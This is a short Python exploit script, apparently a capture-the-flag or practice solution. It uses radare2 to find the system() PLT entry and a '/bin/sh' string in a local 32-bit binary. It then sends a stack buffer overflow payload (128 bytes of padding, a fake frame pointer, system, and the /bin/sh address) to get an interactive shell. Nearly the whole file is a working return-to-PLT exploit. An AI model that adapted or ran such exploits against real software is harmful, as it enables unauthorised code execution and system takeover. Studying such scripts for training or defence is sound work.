import r2pipe
import json
from pwn import *

SYSTEM_PLT = 0x08048370
BIN_SH = 0x080485f0
APP = "./main"

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis
# Find ARG based on String
strings = json.loads(r2.cmd('izj'))
for s in strings:
    clean_str = base64.standard_b64decode(s['string'])
    if clean_str == "/bin/sh":
        BIN_SH = s['vaddr']
        print("{} find on {}".format(clean_str, hex(BIN_SH)))

# Find ARG based on Symbols
symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['type'] == 'FUNC' and i['name'] == 'imp.system':
        SYSTEM_PLT = i['vaddr']
        print("{} find on {}".format(i['name'], hex(SYSTEM_PLT)))
    elif i['type'] == 'OBJ' and i['name'] == 'SH':
        ptr = i['vaddr']
        r2.cmd('s {}'.format(hex(ptr)))
        BIN_SH = json.loads(r2.cmd('pxwj 4'))[0]
        print("{} find on {}".format(i['name'], hex(BIN_SH)))

s = process(APP)

# Uncomment for debugging
#gdb.attach(s, '''
#	b*0x080484e5
#	''')

payload = 'A'*128
payload += 'BBBB' # EBP
payload += p32(SYSTEM_PLT)
payload += 'CCCC' # RET ADDRESS SYSTEM
payload += p32(BIN_SH) # 1 PARAM FOR SYSTEM

payload += '\n'
s.send(payload)
print(s.recv())
s.interactive()
s.close()